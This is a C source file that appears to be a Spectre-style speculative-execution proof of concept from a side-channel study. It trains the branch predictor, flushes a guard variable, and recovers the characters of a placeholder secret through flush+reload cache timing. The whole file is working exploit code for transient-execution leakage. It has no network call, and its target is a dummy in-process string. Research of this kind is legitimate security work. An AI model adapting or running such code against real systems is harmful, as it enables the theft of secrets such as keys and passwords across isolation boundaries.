#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include "../lib/gen_array.c"
#include "../lib/time_and_flush.c"
#include "../lib/print_results.c"

#define N_PAGES 256
#define REPETITIONS 10
#define CACHE_HIT 100
#define MAYBE_CACHE_HIT 175
#define SECRET_SIZE 8
#define N_TRAINING 100
#define SECRET "mysecret"
#define false 0
#define true  1

#define DBG false


//int* i_global;
//int* j_global;
//int* k_global;
cp_t* flush_reload_arr;

void victim_subfunc(int i) {
    //char secret_char = SECRET[i_global];
    //volatile cp_t cp = flush_reload_arr[secret_char];
    volatile cp_t cp = flush_reload_arr[SECRET[i]];
    //if(DBG) printf("\tstoring %c in fr_arr\n", secret_char);
}

void attacker_func(int* i_addr, int secret_index) {
    *i_addr = secret_index;
    //if(DBG) printf("\ti_gbl = %d\n", secret_index);
}

/*
 * Variables required in cache:
 *  i_global
 *  SECRET
 *
 * Variables requried in mem:
 *  initialized
 */
void victim_main_func(int initialize_index, int secret_index) {
    int i,j,k;
    int* i_j_k_addresses[3];
    i_j_k_addresses[0] = &i;
    i_j_k_addresses[1] = &j;
    i_j_k_addresses[2] = &k;

    char initialized[3] __attribute__ ((aligned (256)));
    for(int iter = 0; iter < 3; iter++) initialized[iter] = false;  //all false

    //BRO THIS IS A BRANCH, INFLUENCING THE BRANCH PREDICTOR
    *i_j_k_addresses[initialize_index] = initialize_index;
    initialized[initialize_index] = true;

    attacker_func(&i, secret_index);

    //put the required variables in cache
    volatile char* scrt = SECRET;
    volatile int i_copy = i;
    //if(initialize_index==2) printf("\ti = %d\n", i);

    cpuid();
    flush((void*)&initialized[0]);
    cpuid();

    //volatile cp_t cp0 = flush_reload_arr[initialized[0]];
    if(initialized[0]) {
        //volatile cp_t cp0 = flush_reload_arr[0];
        //if(DBG) printf("\tinit[0] is true. \n");

        victim_subfunc(i);
        //volatile cp_t cp = flush_reload_arr[SECRET[i]];
    }

}
//printf("load initialized[0] = %d\n", time_mem_load((void*)&initialized[0]));

int* prepare(int secret_index) {

    flush_reload_arr = init_flush_reload(N_PAGES);
    flush_arr((void*)flush_reload_arr, N_PAGES);

    //access decisions in array, repeated out-of-bounds not traceable for branch predictor
    int n_accesses = N_TRAINING -(rand() % (N_TRAINING/2)) + 1;
    char init_indices[n_accesses];
    char secret_indices[n_accesses];
    for(int i = 0; i < n_accesses; i++) {
        init_indices[i] = 0;
        secret_indices[i] = 0;
    }
    init_indices[n_accesses-1] = 2;
    secret_indices[n_accesses-1] = secret_index;
    cpuid();

    for(int i = 0; i < n_accesses; i++) {
        //if(DBG) printf("\n%d:\tinit %d\tsecret %d\n", i, init_indices[i], secret_indices[i]);
        victim_main_func(init_indices[i], secret_indices[i]);
        cpuid();
        if(init_indices[i] != 2) {
            cpuid();
            flush_arr(flush_reload_arr, N_PAGES);
        }
        cpuid();
    }

    cpuid();

    //time loading duration per array index
    int* results = reload(flush_reload_arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
    unmap_cache_pages(flush_reload_arr, N_PAGES);
    return results;
}

int main(int argc, char** argv) {
    srand(time(0));
    int*** results = alloc_results(REPETITIONS, SECRET_SIZE, N_PAGES); //results[REPETITIONS][SECRET_SIZE][N_PAGES]ints

    //results[0][0] = prepare(1);
    for(int r = 0; r < REPETITIONS; r++) {
        printf("\nREPETITION %d\n", r);
        for (int s = 0; s < SECRET_SIZE; s++) {
            results[r][s] = prepare(s);
            cpuid();
        }
    }

    print_results(results, REPETITIONS, SECRET_SIZE, N_PAGES, CACHE_HIT);

    free_results(results, REPETITIONS, SECRET_SIZE);

}
